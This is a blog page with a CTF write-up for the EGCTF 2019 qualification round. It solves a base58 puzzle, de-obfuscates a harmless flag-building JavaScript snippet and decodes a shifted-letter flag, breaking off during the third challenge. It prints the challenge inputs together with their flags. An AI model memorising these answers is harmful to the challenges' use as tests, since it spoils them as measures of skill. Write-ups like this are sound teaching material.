<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          EGCTF 2019 - Qualification Round - 0xRick
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Analytics -->
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-97164925-2', 'auto');
ga('send', 'pageview');
</script>
<!-- End Google Analytics -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="0xRick" type="application/rss+xml">
</head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>0XRICK</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><h2 id="Hack-The-Box-Write-ups"><a href="#Hack-The-Box-Write-ups" class="headerlink" title="Hack The Box Write-ups"></a>Hack The Box Write-ups</h2><ul>
<li><a href="/hack-the-box/ai/">Hack The Box - AI</a></li>
<li><a href="/hack-the-box/player/">Hack The Box - Player</a></li>
<li><a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></li>
<li><a href="/hack-the-box/craft/">Hack The Box - Craft</a></li>
<li><a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></li>
<li><a href="/hack-the-box/wall/">Hack The Box - Wall</a></li>
<li><a href="/hack-the-box/heist/">Hack The Box - Heist</a></li>
<li><a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></li>
<li><a href="/hack-the-box/networked/">Hack The Box - Networked</a></li>
<li><a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a></li>
<li><a href="/hack-the-box/haystack/">Hack The Box - Haystack</a></li>
<li><a href="/hack-the-box/safe/">Hack The Box - Safe</a></li>
<li><a href="/hack-the-box/ellingson/">Hack The Box - Ellingson</a></li>
<li><a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></li>
<li><a href="/hack-the-box/ghoul">Hack The Box - Ghoul</a></li>
<li><a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></li>
<li><a href="/hack-the-box/kryptos/">Hack The Box - Kryptos</a></li>
<li><a href="/hack-the-box/luke/">Hack The Box - Luke</a></li>
<li><a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></li>
<li><a href="/hack-the-box/bastion-2/">Hack The Box - Bastion (Commando)</a></li>
<li><a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></li>
<li><a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></li>
<li><a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></li>
<li><a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></li>
<li><a href="/hack-the-box/fortune">Hack The Box - Fortune</a></li>
<li><a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></li>
<li><a href="/hack-the-box/ctf/">Hack The Box - CTF</a></li>
<li><a href="/c/categories/#Hack-The-Box"><strong>Older</strong></a></li>
</ul>
<h2 id="Wizard-Labs-Write-ups"><a href="#Wizard-Labs-Write-ups" class="headerlink" title="Wizard Labs Write-ups"></a>Wizard Labs Write-ups</h2><ul>
<li><a href="/wizard-labs/devlife/">Wizard Labs - Devlife</a></li>
<li><a href="/wizard-labs/dummy/">wizard Labs - Dummy</a></li>
</ul>
<h2 id="Basic-Binary-Exploitation"><a href="#Basic-Binary-Exploitation" class="headerlink" title="Basic Binary Exploitation"></a>Basic Binary Exploitation</h2><ul>
<li><a href="/binary-exploitation/bof6/">Bof: re2libc - protostar stack6</a></li>
<li><a href="/binary-exploitation/bof5/">Bof: ShellCode Injection - protostar stack5</a></li>
<li><a href="/binary-exploitation/bof4/">Bof: Taking control of the instruction pointer - protostar stack4</a></li>
<li><a href="/binary-exploitation/bof3/">Bof: Overwriting function pointers - protostar stack3</a></li>
<li><a href="/binary-exploitation/bof2/">Bof: Overwriting stack variables - protostar stack1,2</a></li>
<li><a href="/binary-exploitation/bof1/">Buffer Overflow Explained</a></li>
</ul>
<h2 id="Pwn-Challenges-Write-ups"><a href="#Pwn-Challenges-Write-ups" class="headerlink" title="Pwn Challenges Write-ups"></a>Pwn Challenges Write-ups</h2><ul>
<li><a href="/pwn/collision/">pwnable.kr - collision</a></li>
<li><a href="/pwn/bof/">pwnable.kr - bof</a></li>
<li><a href="/pwn/fd/">pwnable.kr - fd</a></li>
</ul>
<h2 id="Misc-CTF-Write-ups"><a href="#Misc-CTF-Write-ups" class="headerlink" title="Misc CTF Write-ups"></a>Misc CTF Write-ups</h2><ul>
<li><a href="/ctfs/egctf-qual/">EGCTF 2019 - Qualification Round</a></li>
</ul>
<h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><ul>
<li><a href="/lists/stego/">Steganography</a></li>
</ul>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul>
<li><a href="/misc/c2">Building a Basic C2</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <div> <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script> </div> <br>
  <h1 id="EGCTF-2019-Qualification-Round"><a href="#EGCTF-2019-Qualification-Round" class="headerlink" title="EGCTF 2019 - Qualification Round"></a>EGCTF 2019 - Qualification Round</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>I participated in <a href="https://ctf2019.egcert.eg/" target="_blank" rel="noopener">EG-CTF 2019</a> qualification round which was held in Friday November 15 2019 and lasted for 26 hours, These are my quick write-ups for some of the challenges.</p>
<ul>
<li><a href="#starter-decode-me-">Starter: Decode me :)</a></li>
<li><a href="#starter-js-cryptominer">Starter: JS CryptoMiner</a></li>
<li><a href="#starter-rotten-code">Starter: Rotten Code</a></li>
<li><a href="#misc-qr-c0d3">Misc: QR c0d3</a></li>
<li><a href="#web-hold-up">Web: Hold Up</a></li>
<li><a href="#web-tamp3rat0r">Web: Tamp3rat0r</a></li>
<li><a href="#crypto-des-amies">Crypto: Des amies</a></li>
<li><a href="#forensics-data-leakage">Forensics: Data Leakage</a></li>
<li><a href="#forensics-oh-my-salary">Forensics: Oh My Salary!</a></li>
<li><a href="#forensics-secret-agent">Forensics: Secret Agent</a></li>
</ul>
<p><img src="/images/ctfs/egctf-qual/0.png" alt=""></p>
<h2 id="Starter-Decode-me"><a href="#Starter-Decode-me" class="headerlink" title="Starter: Decode me :)"></a>Starter: Decode me :)</h2><h3 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description:"></a>Challenge Description:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Here you are</span><br><span class="line"></span><br><span class="line">The message is 7uvxEhXkGkmPhYQtDE3Eg99ZKfr8kRwFe15nNkg9eyFLKXqe Good luck!!</span><br><span class="line"></span><br><span class="line">Flag Format EGCTF&#123;50m3_l337_73x7&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution:"></a>Solution:</h3><p>This was a very easy one, we’re given an encoded string and we need to decode it to retrieve the flag, I tried some of the known encoding methods and found that it was <code>base-58</code> encoded:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;starter&#x2F;decode-me# base58 -d .&#x2F;message.txt </span><br><span class="line">EGCTF&#123;574r73r_ch4ll3n635_4r3_6r337&#125;</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;starter&#x2F;decode-me#</span><br></pre></td></tr></table></figure>


<h2 id="Starter-JS-CryptoMiner"><a href="#Starter-JS-CryptoMiner" class="headerlink" title="Starter: JS CryptoMiner"></a>Starter: JS CryptoMiner</h2><h3 id="Challenge-Description-1"><a href="#Challenge-Description-1" class="headerlink" title="Challenge Description:"></a>Challenge Description:</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">We found <span class="keyword">this</span> obfuscated JS code and we think it may be a cryptominer. Please confirm and extract the hidden flag.</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a=[<span class="string">'\x57\x44\x4a\x73\x65\x6c\x67\x77\x57\x6a\x46\x69\x62\x6a\x41\x39'</span>,<span class="string">'\x5a\x6e\x4a\x76\x62\x55\x4e\x6f\x59\x58\x4a\x44\x62\x32\x52\x6c'</span>];(<span class="function"><span class="keyword">function</span>(<span class="params">c,d</span>)</span>&#123;<span class="keyword">var</span> e=<span class="function"><span class="keyword">function</span>(<span class="params">f</span>)</span>&#123;<span class="keyword">while</span>(--f)&#123;c[<span class="string">'push'</span>](c[<span class="string">'shift'</span>]());&#125;&#125;;e(++d);&#125;(a,<span class="number">0xc7</span>));<span class="keyword">var</span> b=<span class="function"><span class="keyword">function</span>(<span class="params">c,d</span>)</span>&#123;c=c<span class="number">-0x0</span>;<span class="keyword">var</span> e=a[c];<span class="keyword">if</span>(b[<span class="string">'mPLuJI'</span>]===<span class="literal">undefined</span>)&#123;(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> f=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> g;<span class="keyword">try</span>&#123;g=<span class="built_in">Function</span>(<span class="string">'return\x20(function()\x20'</span>+<span class="string">'&#123;&#125;.constructor(\x22return\x20this\x22)(\x20)'</span>+<span class="string">');'</span>)();&#125;<span class="keyword">catch</span>(h)&#123;g=<span class="built_in">window</span>;&#125;<span class="keyword">return</span> g;&#125;;<span class="keyword">var</span> i=f();<span class="keyword">var</span> j=<span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='</span>;i[<span class="string">'atob'</span>]||(i[<span class="string">'atob'</span>]=<span class="function"><span class="keyword">function</span>(<span class="params">k</span>)</span>&#123;<span class="keyword">var</span> l=<span class="built_in">String</span>(k)[<span class="string">'replace'</span>](<span class="regexp">/=+$/</span>,<span class="string">''</span>);<span class="keyword">for</span>(<span class="keyword">var</span> m=<span class="number">0x0</span>,n,o,p=<span class="number">0x0</span>,q=<span class="string">''</span>;o=l[<span class="string">'charAt'</span>](p++);~o&amp;&amp;(n=m%<span class="number">0x4</span>?n*<span class="number">0x40</span>+o:o,m++%<span class="number">0x4</span>)?q+=<span class="built_in">String</span>[<span class="string">'fromCharCode'</span>](<span class="number">0xff</span>&amp;n&gt;&gt;(<span class="number">-0x2</span>*m&amp;<span class="number">0x6</span>)):<span class="number">0x0</span>)&#123;o=j[<span class="string">'indexOf'</span>](o);&#125;<span class="keyword">return</span> q;&#125;);&#125;());b[<span class="string">'QMZCsz'</span>]=<span class="function"><span class="keyword">function</span>(<span class="params">r</span>)</span>&#123;<span class="keyword">var</span> s=atob(r);<span class="keyword">var</span> t=[];<span class="keyword">for</span>(<span class="keyword">var</span> u=<span class="number">0x0</span>,v=s[<span class="string">'length'</span>];u&lt;v;u++)&#123;t+=<span class="string">'%'</span>+(<span class="string">'00'</span>+s[<span class="string">'charCodeAt'</span>](u)[<span class="string">'toString'</span>](<span class="number">0x10</span>))[<span class="string">'slice'</span>](<span class="number">-0x2</span>);&#125;<span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(t);&#125;;b[<span class="string">'MdcAcN'</span>]=&#123;&#125;;b[<span class="string">'mPLuJI'</span>]=!![];&#125;<span class="keyword">var</span> w=b[<span class="string">'MdcAcN'</span>][c];<span class="keyword">if</span>(w===<span class="literal">undefined</span>)&#123;e=b[<span class="string">'QMZCsz'</span>](e);b[<span class="string">'MdcAcN'</span>][c]=e;&#125;<span class="keyword">else</span>&#123;e=w;&#125;<span class="keyword">return</span> e;&#125;;variable=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;flag=<span class="built_in">String</span>[b(<span class="string">'0x0'</span>)](<span class="number">0x45</span>,<span class="number">0x47</span>,<span class="number">0x43</span>,<span class="number">0x54</span>,<span class="number">0x46</span>,<span class="number">0x7b</span>,<span class="number">0x4a</span>,<span class="number">0x61</span>,<span class="number">0x76</span>,<span class="number">0x61</span>,<span class="number">0x53</span>,<span class="number">0x63</span>,<span class="number">0x72</span>,<span class="number">0x69</span>,<span class="number">0x70</span>,<span class="number">0x74</span>)+atob(b(<span class="string">'0x1'</span>));&#125;;another=!![];</span><br></pre></td></tr></table></figure>
<h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution:"></a>Solution:</h3><p>I used <a href="https://beautifier.io/" target="_blank" rel="noopener">beautifier.io</a> to beautify the <code>javascript</code> code:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="string">'\x57\x44\x4a\x73\x65\x6c\x67\x77\x57\x6a\x46\x69\x62\x6a\x41\x39'</span>, <span class="string">'\x5a\x6e\x4a\x76\x62\x55\x4e\x6f\x59\x58\x4a\x44\x62\x32\x52\x6c'</span>];</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">c, d</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> e = <span class="function"><span class="keyword">function</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (--f) &#123;</span><br><span class="line">            c[<span class="string">'push'</span>](c[<span class="string">'shift'</span>]());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    e(++d);</span><br><span class="line">&#125;(a, <span class="number">0xc7</span>));</span><br><span class="line"><span class="keyword">var</span> b = <span class="function"><span class="keyword">function</span>(<span class="params">c, d</span>) </span>&#123;</span><br><span class="line">    c = c - <span class="number">0x0</span>;</span><br><span class="line">    <span class="keyword">var</span> e = a[c];</span><br><span class="line">    <span class="keyword">if</span> (b[<span class="string">'mPLuJI'</span>] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">        (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">var</span> g;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    g = <span class="built_in">Function</span>(<span class="string">'return\x20(function()\x20'</span> + <span class="string">'&#123;&#125;.constructor(\x22return\x20this\x22)(\x20)'</span> + <span class="string">');'</span>)();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (h) &#123;</span><br><span class="line">                    g = <span class="built_in">window</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> g;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">var</span> i = f();</span><br><span class="line">            <span class="keyword">var</span> j = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='</span>;</span><br><span class="line">            i[<span class="string">'atob'</span>] || (i[<span class="string">'atob'</span>] = <span class="function"><span class="keyword">function</span>(<span class="params">k</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">var</span> l = <span class="built_in">String</span>(k)[<span class="string">'replace'</span>](<span class="regexp">/=+$/</span>, <span class="string">''</span>);</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> m = <span class="number">0x0</span>, n, o, p = <span class="number">0x0</span>, q = <span class="string">''</span>; o = l[<span class="string">'charAt'</span>](p++); ~o &amp;&amp; (n = m % <span class="number">0x4</span> ? n * <span class="number">0x40</span> + o : o, m++ % <span class="number">0x4</span>) ? q += <span class="built_in">String</span>[<span class="string">'fromCharCode'</span>](<span class="number">0xff</span> &amp; n &gt;&gt; (<span class="number">-0x2</span> * m &amp; <span class="number">0x6</span>)) : <span class="number">0x0</span>) &#123;</span><br><span class="line">                    o = j[<span class="string">'indexOf'</span>](o);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> q;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;());</span><br><span class="line">        b[<span class="string">'QMZCsz'</span>] = <span class="function"><span class="keyword">function</span>(<span class="params">r</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> s = atob(r);</span><br><span class="line">            <span class="keyword">var</span> t = [];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> u = <span class="number">0x0</span>, v = s[<span class="string">'length'</span>]; u &lt; v; u++) &#123;</span><br><span class="line">                t += <span class="string">'%'</span> + (<span class="string">'00'</span> + s[<span class="string">'charCodeAt'</span>](u)[<span class="string">'toString'</span>](<span class="number">0x10</span>))[<span class="string">'slice'</span>](<span class="number">-0x2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(t);</span><br><span class="line">        &#125;;</span><br><span class="line">        b[<span class="string">'MdcAcN'</span>] = &#123;&#125;;</span><br><span class="line">        b[<span class="string">'mPLuJI'</span>] = !![];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> w = b[<span class="string">'MdcAcN'</span>][c];</span><br><span class="line">    <span class="keyword">if</span> (w === <span class="literal">undefined</span>) &#123;</span><br><span class="line">        e = b[<span class="string">'QMZCsz'</span>](e);</span><br><span class="line">        b[<span class="string">'MdcAcN'</span>][c] = e;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        e = w;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> e;</span><br><span class="line">&#125;;</span><br><span class="line">variable = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    flag = <span class="built_in">String</span>[b(<span class="string">'0x0'</span>)](<span class="number">0x45</span>, <span class="number">0x47</span>, <span class="number">0x43</span>, <span class="number">0x54</span>, <span class="number">0x46</span>, <span class="number">0x7b</span>, <span class="number">0x4a</span>, <span class="number">0x61</span>, <span class="number">0x76</span>, <span class="number">0x61</span>, <span class="number">0x53</span>, <span class="number">0x63</span>, <span class="number">0x72</span>, <span class="number">0x69</span>, <span class="number">0x70</span>, <span class="number">0x74</span>) + atob(b(<span class="string">'0x1'</span>));</span><br><span class="line">&#125;;</span><br><span class="line">another = !![];</span><br></pre></td></tr></table></figure>
<p>By looking at the end of the code we’ll see this function:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">variable = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    flag = <span class="built_in">String</span>[b(<span class="string">'0x0'</span>)](<span class="number">0x45</span>, <span class="number">0x47</span>, <span class="number">0x43</span>, <span class="number">0x54</span>, <span class="number">0x46</span>, <span class="number">0x7b</span>, <span class="number">0x4a</span>, <span class="number">0x61</span>, <span class="number">0x76</span>, <span class="number">0x61</span>, <span class="number">0x53</span>, <span class="number">0x63</span>, <span class="number">0x72</span>, <span class="number">0x69</span>, <span class="number">0x70</span>, <span class="number">0x74</span>) + atob(b(<span class="string">'0x1'</span>));</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>So what I did was to paste the code in the <code>js</code> console, call the function and read the flag:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/EGCTF-Quals/starter/JSCryptoMiner# js</span><br><span class="line">&gt; <span class="keyword">var</span> a=[<span class="string">'\x57\x44\x4a\x73\x65\x6c\x67\x77\x57\x6a\x46\x69\x62\x6a\x41\x39'</span>,<span class="string">'\x5a\x6e\x4a\x76\x62\x55\x4e\x6f\x59\x58\x4a\x44\x62\x32\x52\x6c'</span>];(<span class="function"><span class="keyword">function</span>(<span class="params">c,d</span>)</span>&#123;<span class="keyword">var</span> e=<span class="function"><span class="keyword">function</span>(<span class="params">f</span>)</span>&#123;<span class="keyword">while</span>(--f)&#123;c[<span class="string">'push'</span>](c[<span class="string">'shift'</span>]());&#125;&#125;;e(++d);&#125;(a,<span class="number">0xc7</span>));<span class="keyword">var</span> b=<span class="function"><span class="keyword">function</span>(<span class="params">c,d</span>)</span>&#123;c=c<span class="number">-0x0</span>;<span class="keyword">var</span> e=a[c];<span class="keyword">if</span>(b[<span class="string">'mPLuJI'</span>]===<span class="literal">undefined</span>)&#123;(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> f=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> g;<span class="keyword">try</span>&#123;g=<span class="built_in">Function</span>(<span class="string">'return\x20(function()\x20'</span>+<span class="string">'&#123;&#125;.constructor(\x22return\x20this\x22)(\x20)'</span>+<span class="string">');'</span>)();&#125;<span class="keyword">catch</span>(h)&#123;g=<span class="built_in">window</span>;&#125;<span class="keyword">return</span> g;&#125;;<span class="keyword">var</span> i=f();<span class="keyword">var</span> j=<span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='</span>;i[<span class="string">'atob'</span>]||(i[<span class="string">'atob'</span>]=<span class="function"><span class="keyword">function</span>(<span class="params">k</span>)</span>&#123;<span class="keyword">var</span> l=<span class="built_in">String</span>(k)[<span class="string">'replace'</span>](<span class="regexp">/=+$/</span>,<span class="string">''</span>);<span class="keyword">for</span>(<span class="keyword">var</span> m=<span class="number">0x0</span>,n,o,p=<span class="number">0x0</span>,q=<span class="string">''</span>;o=l[<span class="string">'charAt'</span>](p++);~o&amp;&amp;(n=m%<span class="number">0x4</span>?n*<span class="number">0x40</span>+o:o,m++%<span class="number">0x4</span>)?q+=<span class="built_in">String</span>[<span class="string">'fromCharCode'</span>](<span class="number">0xff</span>&amp;n&gt;&gt;(<span class="number">-0x2</span>*m&amp;<span class="number">0x6</span>)):<span class="number">0x0</span>)&#123;o=j[<span class="string">'indexOf'</span>](o);&#125;<span class="keyword">return</span> q;&#125;);&#125;());b[<span class="string">'QMZCsz'</span>]=<span class="function"><span class="keyword">function</span>(<span class="params">r</span>)</span>&#123;<span class="keyword">var</span> s=atob(r);<span class="keyword">var</span> t=[];<span class="keyword">for</span>(<span class="keyword">var</span> u=<span class="number">0x0</span>,v=s[<span class="string">'length'</span>];u&lt;v;u++)&#123;t+=<span class="string">'%'</span>+(<span class="string">'00'</span>+s[<span class="string">'charCodeAt'</span>](u)[<span class="string">'toString'</span>](<span class="number">0x10</span>))[<span class="string">'slice'</span>](<span class="number">-0x2</span>);&#125;<span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(t);&#125;;b[<span class="string">'MdcAcN'</span>]=&#123;&#125;;b[<span class="string">'mPLuJI'</span>]=!![];&#125;<span class="keyword">var</span> w=b[<span class="string">'MdcAcN'</span>][c];<span class="keyword">if</span>(w===<span class="literal">undefined</span>)&#123;e=b[<span class="string">'QMZCsz'</span></span><br><span class="line">](e);b[<span class="string">'MdcAcN'</span>][c]=e;&#125;<span class="keyword">else</span>&#123;e=w;&#125;<span class="keyword">return</span> e;&#125;;variable=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;flag=<span class="built_in">String</span>[b(<span class="string">'0x0'</span>)](<span class="number">0x45</span>,<span class="number">0x47</span>,<span class="number">0x43</span>,<span class="number">0x54</span>,<span class="number">0x46</span>,<span class="number">0x7b</span>,<span class="number">0x4a</span>,<span class="number">0x61</span>,<span class="number">0x76</span>,<span class="number">0x61</span>,<span class="number">0x53</span>,<span class="number">0x63</span>,<span class="number">0x72</span>,<span class="number">0x69</span>,<span class="number">0x70</span>,<span class="number">0x74</span>)+atob(b(<span class="string">'0x1'</span>));&#125;;another=!![];</span><br><span class="line"><span class="literal">true</span></span><br><span class="line">&gt; variable()</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">&gt; flag</span><br><span class="line"><span class="string">'EGCTF&#123;JavaScript_is_Fun&#125;'</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>


<h2 id="Starter-Rotten-Code"><a href="#Starter-Rotten-Code" class="headerlink" title="Starter: Rotten Code"></a>Starter: Rotten Code</h2><h3 id="Challenge-Description-2"><a href="#Challenge-Description-2" class="headerlink" title="Challenge Description:"></a>Challenge Description:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">We found this key online but it does not make any sense to us. Can you figure anything out?</span><br><span class="line"></span><br><span class="line">CEARD&#123;Pmr14_jm0m0m0m0m0m0m0m0m0m0mn&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution:"></a>Solution:</h3><p>By looking at the text it’s easily recognizable that this is the flag but the letters are substituted.<br>We know that the flag starts with <code>EGCTF</code> so <code>C</code> is <code>E</code> and <code>E</code> is <code>G</code>, which means that the offset is 2. I used <a href="https://rot13.com/" target="_blank" rel="noopener">rot13.com</a> to decode the flag:<br><img src="/images/ctfs/egctf-qual/1.png" alt=""></p>
